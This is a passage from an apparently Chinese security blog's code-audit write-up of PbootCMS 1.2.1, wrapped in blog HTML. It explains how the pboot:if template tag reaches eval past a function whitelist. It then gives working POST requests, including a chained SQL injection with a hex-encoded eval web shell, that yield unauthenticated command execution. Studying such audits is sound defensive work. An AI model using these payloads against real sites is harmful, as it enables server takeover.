class="variable">$matches</span>)) &#123;</span><br><span class="line">    <span class="variable">$count</span> = count(<span class="variable">$matches</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$count</span>; <span class="variable">$i</span> ++) &#123;</span><br><span class="line">      <span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      <span class="variable">$out_html</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      <span class="variable">$danger</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$white_fun</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&#x27;date&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;in_array&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;explode&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;implode&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;get&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 带有函数的条件语句进行安全校验</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">&#x27;/([\w]+)([\s]+)?\(/i&#x27;</span>, <span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>], <span class="variable">$matches2</span>)) &#123;</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="variable">$matches2</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (function_exists(<span class="variable">$value</span>) &amp;&amp; ! in_array(<span class="variable">$value</span>, <span class="variable">$white_fun</span>)) &#123;</span><br><span class="line">          <span class="variable">$danger</span> = <span class="literal">true</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果有危险函数，则不解析该IF</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$danger</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>] = decode_string(<span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>]); <span class="comment">// 解码条件字符串</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;if(&#x27;</span> . <span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>] . <span class="string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span>);</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到使用了eval标签，所以我们的语句<code>&#123;pboot:if(php code)&#125;!!!&#123;/pboot:if&#125;</code><br>他使用了<code>function_exists</code>函数来判断是否是已经定义的函数</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt9ta94pq3j60xy0hkgus02.jpg" alt="image-20210808231150602"></p>
+<p>但是<code>eval</code>却不是函数，所以可以绕过他</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt9taev4q0j60xy0ht7cq02.jpg" alt="image-20210808231115206"></p>
+<p>然后还有一个<code>decode_string</code>很简单就可以绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode_string</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$string</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$string</span>)) &#123; <span class="comment">// 数组处理</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$string</span>[<span class="variable">$key</span>] = decode_string(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_object(<span class="variable">$string</span>)) &#123; <span class="comment">// 对象处理</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$string</span>-&gt;<span class="variable">$key</span> = decode_string(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 字符串处理</span></span><br><span class="line">        <span class="variable">$string</span> = stripcslashes(<span class="variable">$string</span>);</span><br><span class="line">        <span class="variable">$string</span> = htmlspecialchars_decode(<span class="variable">$string</span>, ENT_QUOTES);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们发现Home调用这个方法一共5处</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gt9takh2uvj31400i4wud.jpg" alt="image-20210808232701615"></p>
+<p>我们找一处演示一下，就在留言处演示一下吧。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url:http:&#x2F;&#x2F;pbootcms&#x2F;index.php&#x2F;Message&#x2F;add</span><br><span class="line">post：</span><br><span class="line">    contacts &#x3D; 1</span><br><span class="line">    mobile &#x3D; 1</span><br><span class="line">    content &#x3D; &#123;pboot:if(eval($_POST[1]))&#125;!!!&#123;&#x2F;pboot:if&#125;</span><br><span class="line">    checkcode &#x3D; 验证码</span><br></pre></td></tr></table></figure>
+
+<p>然后我们需要去后台将前台显示打开</p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gt9taqfi1nj31el0f2tf5.jpg" alt="image-20210808232911181"></p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gt9tavrss1j31eu0jxamm.jpg" alt="image-20210808233229633"></p>
+<p>因为这里需要管理员点击才能触发,所以显得有些鸡肋,但是这里我们可利用<code>insert</code>注入在插入数据库时就改变其显示状态来进行漏洞利用</p>
+<p>我们进入数据库查看留言状态发现status=1时就可以前台显示。</p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gt9tb0vbj2j312108sgvu.jpg" alt="image-20210808233459980"></p>
+<p>刚好我们前面有一个留言板SQL注入<br>所以就有了我们的组合漏洞利用:<strong>前台无限制命令执行:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url:http:&#x2F;&#x2F;pbootcms&#x2F;index.php&#x2F;Message&#x2F;add</span><br><span class="line"></span><br><span class="line">POST:content&#x3D;1&amp;mobile&#x3D;1&amp;contacts[acode&#96;,&#96;mobile&#96;,&#96;content&#96;,&#96;user_ip&#96;,&#96;user_os&#96;,&#96;user_bs&#96;,&#96;recontent&#96;,&#96;status&#96;,&#96;create_user&#96;,&#96;update_user&#96;,&#96;create_time&#96;,&#96;update_time&#96;) VALUES (&#39;cn&#39;,&#39;1&#39;,0x7B70626F6F743A6966286576616C28245F504F53545B7A5D29297D2121217B2F70626F6F743A69667D,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;); -- a] &#x3D; 1&amp;checkcode&#x3D;xxxx</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt9tb762swj30u10ddqb5.jpg" alt="image-20210808234114695"></p>
+<p>进入数据库查看<br><img src="https://tva1.sinaimg.cn/large/00774lbQly1gt9tbcu5g9j310n07e46v.jpg" alt="image-20210808234148282"></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>师傅写的太好了，很多就直接搬过来了,也随着师傅思路找到了其他漏洞。<br><a target="_blank" rel="noopener" href="https://p0rz9.github.io/2018/10/17/PbootCMS_V1.2.1%E7%BB%84%E5%90%88%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1">https://p0rz9.github.io/2018/10/17/PbootCMS_V1.2.1%E7%BB%84%E5%90%88%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>
+                Author：<a href="http://example.com">
+                        R0ser1
+                    </a>
+                    <p>发表日期：<a href="http://example.com/2021/08/09/PbootCMS1-2-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/">
+                            August 9th 2021, 8:51:00 am
+                        </a>
+                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可
+                    </p>
+        </div>
+        
+            <!-- paginator  -->
+            <ul class="post-paginator">
+                <li class="next">
+                    
+                </li>
+                <li class="previous">
+                    
+                        <div class="prevSlogan">Previous Post</div>
+                        <a href="/2021/08/06/%E7%86%8A%E6%B5%B7CMS1-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" title="熊海CMS1.0代码审计学习">
+                            <div class="prevTitle">
+                                熊海CMS1.0代码审计学习
+                            </div>
+                        </a>
+                        
+                </li>
+            </ul>
+            <!-- 评论插件 -->
+            <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+                
+                    
+                         
+                            <!-- utteranc评论 -->
+
+                                <!-- partial('_partial/comment/changyan') -->
+                                <!--PC版-->
+
+
+                                    
+                                        
+
+                                            <!-- 评论 -->
+
+                                            <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+                                            
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:R0ser1@foxmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2"><span class="toc-number">2.</span> <span class="toc-text">环境部署</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2CMS"><span class="toc-number">2.1.</span> <span class="toc-text">部署CMS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B4%E4%BD%93%E6%A1%86%E6%9E%B6%E6%9E%84%E9%80%A0"><span class="toc-number">2.2.</span> <span class="toc-text">整体框架构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1"><span class="toc-number">2.3.</span> <span class="toc-text">路由</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%8F%82%E6%95%B0%E8%BF%87%E6%BB%A4%E6%83%85%E5%86%B5"><span class="toc-number">2.4.</span> <span class="toc-text">系统参数过滤情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%86%E6%8E%A5%E7%B3%BB%E7%BB%9FDB%E7%B1%BB%EF%BC%8C%E6%95%B0%E6%8D%AE%E5%BA%95%E5%B1%82%E6%93%8D%E4%BD%9C%E6%96%B9%E6%B3%95"><span class="toc-number">2.5.</span> <span class="toc-text">了接系统DB类，数据底层操作方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%90%9C%E5%AF%BB%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">搜寻漏洞及其利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#insert-%E6%B3%A8%E5%85%A5%E4%B8%80-%E7%95%99%E8%A8%80%E5%A4%84"><span class="toc-number">4.</span> <span class="toc-text">insert 注入一[留言处]</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#insert-%E6%B3%A8%E5%85%A5%E4%BA%8C-%E9%80%9A%E8%AF%9D"><span class="toc-number">5.</span> <span class="toc-text">insert 注入二[通话]</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%BB%E9%A1%B5%E5%A4%84SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">主页处SQL注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%A4%84%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">搜索处注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#API%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">API注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%B8%A1%E8%82%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">9.</span> <span class="toc-text">鸡肋SQL注入漏洞发现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">10.</span> <span class="toc-text">前台无限制命令执行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">11.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+    
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 18
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2021 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/09</span><a class="archive-post-title" href= "/2021/08/09/PbootCMS1-2-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" >PbootCMS1.2.1代码审计学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/2021/08/06/%E7%86%8A%E6%B5%B7CMS1-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" >熊海CMS1.0代码审计学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/2021/08/06/bluecms1-6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" >bluecms1.6代码审计学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/04</span><a class="archive-post-title" href= "/2021/08/04/Laravel%E4%B8%8D%E8%A7%84%E8%8C%83%E5%86%99%E6%B3%95%E5%AF%BC%E8%87%B4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" >Laravel不规范写法导致注入漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span><a class="archive-post-title" href= "/2021/08/03/ThinkPHP5-x%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" >ThinkPHP5.x注入漏洞学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/29</span><a class="archive-post-title" href= "/2021/07/29/Wordpress-4-9-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" >Wordpress<= 4.9.6任意文件删除漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/29</span><a class="archive-post-title" href= "/2021/07/29/ThinkPHP3-2%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" >ThinkPHP3.2注入漏洞学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/21</span><a class="archive-post-title" href= "/2021/07/21/PHPCMSV9%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" >PHPCMSV9版本代码审计学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/21</span><a class="archive-post-title" href= "/2021/07/21/DedeCMS%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" >DedeCMS历史版本代码审计学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span><a class="archive-post-title" href= "/2021/07/20/%E5%AE%89%E5%8D%93%E6%97%A0%E6%B3%95%E6%8A%93%E5%8F%96HTTPS%E9%97%AE%E9%A2%98/" >安卓无法抓取HTTPS问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href= "/2021/07/17/Mysql%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E5%A4%87%E5%BF%98%E5%BD%95/" >Mysql注入技巧备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href= "/2021/07/17/Tryhackme%E8%AE%B0%E5%BD%95liunx%E6%8F%90%E6%9D%83/" >Tryhackme记录liunx提权</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href= "/2021/07/17/Volatility/" >Volatility</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href= "/2021/05/17/Mysql-Join%E6%B3%A8%E5%85%A5/" >Mysql_Join注入技巧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href= "/2021/05/17/XSS%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/" >XSS一些记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2021/05/12/DNSlog%E6%B3%A8%E5%85%A5/" >DNSlog注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2021/05/03/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" >CTF反序列字符串逃逸</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2021/03/21/Meterpreter%E5%90%8E%E6%B8%97%E9%80%8F/" >Meterpreter后渗透</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="meterpreter"><span class="iconfont-archer">&#xe606;</span>meterpreter</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="ThinkPHP"><span class="iconfont-archer">&#xe606;</span>ThinkPHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="杂七杂八"><span class="iconfont-archer">&#xe606;</span>杂七杂八</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="Laravel"><span class="iconfont-archer">&#xe606;</span>Laravel</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "R0ser1"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
